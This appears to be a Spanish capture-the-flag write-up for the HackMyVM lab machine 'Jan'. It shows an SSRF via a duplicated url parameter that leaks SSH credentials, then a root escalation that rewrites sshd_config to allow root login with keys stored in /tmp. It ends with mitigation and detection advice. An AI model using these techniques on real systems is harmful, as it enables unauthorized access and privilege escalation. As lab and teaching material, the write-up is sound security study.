@@ -1,0 +1,402 @@
+---
+title: Jan
+description: Resolución completa de la máquina virtual *Jan* de HackMyVM, enfocada en Server-Side Request Forgery (SSRF) y escalada mediante configuración insegura de SSH.
+---
+
+## Introducción
+
+Este documento detalla la metodología y procedimiento completo para comprometer la máquina **Jan**, desarrollada por *sml* para HackMyVM y clasificada con dificultad **Principiante**. Esta máquina presenta un escenario donde vulnerabilidades de SSRF se combinan con mala configuración de servicios para permitir escalada completa de privilegios.
+
+La resolución sigue una metodología estructurada:
+
+1. **Reconocimiento:** Enumeración de servicios y descubrimiento de endpoints vulnerables.
+2. **Explotación:** Explotación de SSRF para acceso a recursos internos y obtención de credenciales.
+3. **Escalada de privilegios:** Abuso de permisos sudo para modificar configuración de SSH y obtener acceso root.
+
+El entorno de prueba fue desplegado en VirtualBox utilizando una imagen OVA proporcionada por HackMyVM.
+
+---
+
+## Información Técnica
+
+| Atributo       | Valor            |
+|----------------|------------------|
+| **Nombre**     | Jan              |
+| **Autor**      | sml              |
+| **Dificultad** | Principiante     |
+| **Fecha**      | 2025-01-30       |
+| **Plataforma** | HackMyVM         |
+| **Formato**    | Imagen OVA       |
+| **IP Objetivo**| 192.168.100.166  |
+
+---
+
+## Fase 1 — Despliegue y Configuración
+
+### 1.1 Descarga y Preparación
+Descargamos la máquina desde HackMyVM y la desplegamos en VirtualBox como una imagen OVA.
+
+### 1.2 Identificación de la IP
+Una vez iniciada la máquina, obtenemos la dirección IP asignada:
+
+```
+Dirección IP objetivo: 192.168.100.166
+```
+
+### 1.3 Organización del Workspace
+Creamos una estructura organizada para documentar el proceso:
+
+```bash
+mkdir -p Jan/{content,exploits,nmap,web,scripts}
+cd Jan
+```
+
+---
+
+## Fase 2 — Reconocimiento
+
+### 2.1 Escaneo de Puertos
+Ejecutamos un escaneo TCP SYN para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 192.168.100.166 -oG allPorts
+```
+
+**Resultados:**
+- **22/tcp** — SSH (Secure Shell)
+- **80/tcp** — HTTP (Web Server)
+
+### 2.2 Enumeración Web
+Realizamos un escaneo exhaustivo de directorios:
+
+```bash
+feroxbuster -u http://192.168.100.166 -w WORDLIST -x html,php,txt,js -t 100 -C 404
+```
+
+![Resultado del escaneo](https://res.cloudinary.com/dewqswzke/image/upload/v1767683789/Feroxbuster_u6jdsp.png)
+
+*Figura 1: Recursos web descubiertos*
+
+### 2.3 Análisis de Endpoints Descubiertos
+
+1. **/redirect** — Endpoint que solicita una URL
+   ![Página de redirect](https://res.cloudinary.com/dewqswzke/image/upload/v1767683784/Redirect_vsjmoo.png)
+   *Figura 2: Endpoint /redirect que acepta parámetro URL*
+
+2. **/robots.txt** — Archivo que revela endpoints válidos
+   ![Contenido de robots.txt](https://res.cloudinary.com/dewqswzke/image/upload/v1767683785/Robots_nibkik.png)
+   *Figura 3: Endpoints permitidos según robots.txt*
+
+### 2.4 Descubrimiento de Recurso Interno
+Analizando robots.txt, encontramos el endpoint `/credz`:
+
+```bash
+curl -s http://192.168.100.166/credz
+```
+
+![Acceso denegado a credz](https://res.cloudinary.com/dewqswzke/image/upload/v1767683787/Credz_idglnd.png)
+
+*Figura 4: Endpoint /credz solo accesible internamente*
+
+**Hallazgo crítico:** El endpoint `/credz` solo es accesible desde localhost, sugiriendo posible vulnerabilidad SSRF.
+
+---
+
+## Fase 3 — Explotación
+
+### 3.1 Explotación de SSRF
+Utilizamos el endpoint `/redirect` para acceder al recurso interno `/credz`:
+
+```bash
+curl "http://192.168.100.166/redirect?url=/credz&url=/credz"
+```
+
+![Credenciales obtenidas via SSRF](https://res.cloudinary.com/dewqswzke/image/upload/v1767683788/Curl_d0npyr.png)
+
+*Figura 5: Credenciales obtenidas mediante SSRF*
+
+**Credenciales descubiertas:**
+- Usuario: `ssh`
+- Contraseña: `47P8DBV7BxYd`
+
+### 3.2 Acceso Inicial al Sistema
+Utilizamos las credenciales obtenidas para acceder por SSH:
+
+```bash
+ssh ssh@192.168.100.166
+# Contraseña: 47P8DBV7BxYd
+```
+
+![Conexión SSH exitosa](https://res.cloudinary.com/dewqswzke/image/upload/v1767683786/SSH_pjysx6.png)
+
+*Figura 6: Acceso SSH como usuario ssh*
+
+---
+
+## Fase 4 — Escalada de Privilegios
+
+### 4.1 Enumeración del Sistema
+Comenzamos la enumeración post-explotación:
+
+```bash
+sudo -l
+```
+
+![Privilegios sudo del usuario ssh](https://res.cloudinary.com/dewqswzke/image/upload/v1767683787/Sudo-l_evaai6.png)
+
+*Figura 7: Permisos sudo que permiten controlar servicio SSH*
+
+**Hallazgos importantes:**
+1. `(root) NOPASSWD: /sbin/service sshd *` — Puede controlar el servicio SSH
+2. Capacidad para editar `/etc/ssh/sshd_config`
+
+### 4.2 De `ssh` → `root`
+
+#### 4.2.1 Modificación de Configuración SSH
+Editamos el archivo de configuración SSH:
+
+```bash
+sudo vi /etc/ssh/sshd_config
+```
+
+**Cambios aplicados:**
+```bash
+# Configuración vulnerable añadida
+PermitRootLogin yes
+AuthorizedKeysFile /tmp/authorized_keys
+PubkeyAuthentication yes
+StrictModes no
+```
+
+#### 4.2.2 Generación de Clave SSH en Atacante
+En nuestra máquina atacante generamos una clave SSH:
+
+```bash
+ssh-keygen -t rsa -f id_rsa_root -N ""
+```
+
+#### 4.2.3 Configuración de Autenticación por Clave
+Copiamos la clave pública al servidor:
+
+```bash
+# En el servidor objetivo
+echo "[CONTENIDO_DE_id_rsa_root.pub]" > /tmp/authorized_keys
+chmod 644 /tmp/authorized_keys
+```
+
+#### 4.2.4 Reinicio del Servicio SSH
+Reiniciamos el servicio SSH con los nuevos cambios:
+
+```bash
+sudo /sbin/service sshd restart
+```
+
+#### 4.2.5 Conexión como Root
+Desde nuestra máquina atacante nos conectamos como root:
+
+```bash
+ssh root@192.168.100.166 -i id_rsa_root
+```
+
+![Acceso root exitoso](https://res.cloudinary.com/dewqswzke/image/upload/v1767683786/Root_wbjpjb.png)
+
+*Figura 8: Shell como usuario root obtenida*
+
+### 4.3 Verificación Final
+```bash
+id
+whoami
+```
+
+---
+
+## Análisis de Vulnerabilidades
+
+### 5.1 Fallos de Seguridad Identificados
+
+| Vulnerabilidad | Severidad | Impacto | CWE/Referencia |
+|----------------|-----------|---------|----------------|
+| Server-Side Request Forgery (SSRF) | Alta | Acceso a recursos internos | CWE-918 |
+| Credenciales almacenadas en endpoint interno | Media | Exposición de información sensible | CWE-312 |
+| Configuración insegura de sudo (servicio SSH) | Crítica | Control completo del servicio SSH | CWE-269 |
+| Capacidad de modificar sshd_config sin restricciones | Crítica | Alteración de mecanismos de autenticación | CWE-732 |
+| Permiso para reiniciar servicios críticos | Alta | Interrupción/Modificación de servicios | CWE-250 |
+
+### 5.2 Recomendaciones de Mitigación Específicas
+
+#### 5.2.1 Protección contra SSRF
+**Problema específico:** Endpoint `/redirect` permite acceder a recursos internos como `/credz`.
+
+**Soluciones específicas:**
+
+1. **Validar y sanitizar URLs en el endpoint /redirect:**
+   ```php
+   // En el código de /redirect
+   $allowed_domains = ['example.com', 'trusted-site.com'];
+   $url = parse_url($_GET['url'], PHP_URL_HOST);
+   
+   if (!in_array($url, $allowed_domains)) {
+       header('HTTP/1.1 403 Forbidden');
+       die('Acceso no permitido a este recurso');
+   }
+   ```
+
+2. **Implementar lista blanca de recursos accesibles:**
+   ```php
+   $allowed_paths = ['/public/', '/images/', '/css/'];
+   $requested_path = $_GET['url'];
+   
+   $allowed = false;
+   foreach ($allowed_paths as $path) {
+       if (strpos($requested_path, $path) === 0) {
+           $allowed = true;
+           break;
+       }
+   }
+   
+   if (!$allowed) {
+       die('Recurso no accesible');
+   }
+   ```
+
+3. **Configurar restricciones de red en servidor web:**
+   ```apache
+   # /etc/apache2/sites-available/000-default.conf
+   <Location "/redirect">
+       Require all denied
+       Require ip 127.0.0.1
+       # Permitir solo localhost si es necesario
+   </Location>
+   ```
+
+#### 5.2.2 Protección de Credenciales
+**Problema específico:** Credenciales almacenadas en endpoint `/credz`.
+
+**Soluciones específicas:**
+
+1. **Eliminar endpoint de credenciales o moverlo fuera del document root:**
+   ```bash
+   # Mover credz fuera del alcance web
+   sudo mv /var/www/html/credz /etc/secure/credentials.txt
+   sudo chmod 600 /etc/secure/credentials.txt
+   ```
+
+2. **Implementar autenticación para acceso a recursos sensibles:**
+   ```php
+   // En credz (si debe existir)
+   session_start();
+   if (!isset($_SESSION['admin_authenticated']) || $_SESSION['admin_authenticated'] !== true) {
+       header('HTTP/1.1 401 Unauthorized');
+       die('Autenticación requerida');
+   }
+   ```
+
+3. **Utilizar variables de entorno en lugar de archivos:**
+   ```bash
+   # En lugar de archivo, usar variables de entorno
+   export SSH_PASSWORD=$(openssl rand -base64 32)
+   ```
+
+#### 5.2.3 Configuración Segura de Sudo
+**Problema específico:** Usuario `ssh` puede controlar servicio SSH y modificar configuración.
+
+**Soluciones específicas:**
+
+1. **Restringir permisos sudo específicamente:**
+   ```bash
+   # /etc/sudoers.d/ssh-user
+   # INCORRECTO (como en la máquina):
+   ssh ALL=(root) NOPASSWD: /sbin/service sshd *, /usr/bin/vi /etc/ssh/sshd_config
+   
+   # CORRECTO (si es necesario):
+   ssh ALL=(root) NOPASSWD: /sbin/service sshd status, /sbin/service sshd reload
+   ```
+
+2. **Implementar separación de responsabilidades:**
+   ```bash
+   # Crear usuario específico para administración SSH
+   sudo adduser ssh-admin
+   # Solo ssh-admin puede modificar sshd_config
+   ssh-admin ALL=(root) NOPASSWD: /usr/bin/vim /etc/ssh/sshd_config
+   ```
+
+3. **Configurar permisos de solo lectura para sshd_config:**
+   ```bash
+   sudo chmod 644 /etc/ssh/sshd_config
+   sudo chown root:root /etc/ssh/sshd_config
+   ```
+
+#### 5.2.4 Hardening de Configuración SSH
+**Problema específico:** sshd_config permite modificaciones peligrosas.
+
+**Soluciones específicas:**
+
+1. **Implementar configuración SSH segura por defecto:**
+   ```bash
+   # /etc/ssh/sshd_config
+   PermitRootLogin no
+   PasswordAuthentication no
+   PubkeyAuthentication yes
+   AuthorizedKeysFile .ssh/authorized_keys
+   StrictModes yes
+   AllowUsers ssh
+   ```
+
+2. **Configurar AppArmor/SELinux para SSH:**
+   ```bash
+   # Para AppArmor
+   sudo aa-genprof sshd
+   # Restringir escritura en /tmp/authorized_keys
+   ```
+
+3. **Implementar integridad de archivos:**
+   ```bash
+   # Usar aide para monitorear cambios en sshd_config
+   sudo aide --check | grep sshd_config
+   
+   # Configurar alertas por cambios
+   inotifywait -m /etc/ssh/sshd_config -e modify |
+   while read path action file; do
+       echo "sshd_config modificado: $(date)" | mail -s "Alerta SSH" admin@localhost
+   done
+   ```
+
+#### 5.2.5 Monitoreo y Respuesta
+**Implementación específica para esta máquina:**
+
+1. **Monitorear intentos de SSRF:**
+   ```bash
+   # Configurar logging en Apache
+   # /etc/apache2/apache2.conf
+   LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
+   CustomLog /var/log/apache2/access.log combined
+   
+   # Script para detectar SSRF
+   tail -f /var/log/apache2/access.log | grep --line-buffered "/redirect.*url=" |
+   while read line; do
+       echo "Posible SSRF detectado: $line" >> /var/log/ssrf_attempts.log
+   done
+   ```
+
+2. **Alertas para modificaciones de SSH:**
+   ```bash
+   # Script de monitoreo para cambios en SSH
+   # /usr/local/bin/monitor_ssh.sh
+   #!/bin/bash
+   while true; do
+       if [ -f /tmp/authorized_keys ]; then
+           echo "ALERTA: authorized_keys en /tmp detectado $(date)" | \
+           mail -s "Alerta de Seguridad SSH" admin@localhost
+           rm -f /tmp/authorized_keys
+       fi
+       sleep 60
+   done
+   ```
+
+3. **Auditoría de comandos sudo ejecutados:**
+   ```bash
+   # Configurar auditd para sudo
+   # /etc/audit/rules.d/sudo.rules
+   -a always,exit -F arch=b64 -S execve -C uid!=euid -F euid=0 -k privileged_sudo
+   -w /etc/ssh/sshd_config -p wa -k sshd_config_change
+   ```
